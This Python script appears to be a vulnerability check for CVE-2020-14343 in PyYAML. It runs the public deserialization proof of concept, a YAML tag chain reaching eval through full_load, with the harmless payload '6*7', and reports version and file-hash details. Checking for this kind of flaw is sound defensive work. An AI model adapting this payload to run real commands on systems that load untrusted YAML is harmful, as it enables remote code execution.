"""Ground truth: is the PyYAML that this interpreter imports exploitable via CVE-2020-14343?
Runs the public PoC with a harmless payload (eval("6*7")) instead of a shell command."""
import hashlib, json, platform, sys
import yaml

POC = '!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , ["6*7"]]]'
ctor = sys.modules["yaml.constructor"].__file__
try:
    result, vulnerable = repr(yaml.full_load(POC)), None
    vulnerable = result == "(42,)"
except yaml.constructor.ConstructorError as e:
    result, vulnerable = "ConstructorError: " + str(e.problem), False

print(json.dumps({
    "python": platform.python_version(),
    "yaml.__version__": yaml.__version__,
    "yaml.__file__": yaml.__file__,
    "with_libyaml": yaml.__with_libyaml__,
    "constructor.py": ctor,
    "constructor.py sha256": hashlib.sha256(open(ctor, "rb").read()).hexdigest(),
    "FullConstructor python/* tags": sorted(t.rsplit(":", 1)[0].split("2002:")[1]
        for t in yaml.constructor.FullConstructor.yaml_multi_constructors),
    "poc result": result,
    "vulnerable": vulnerable,
}, indent=2))
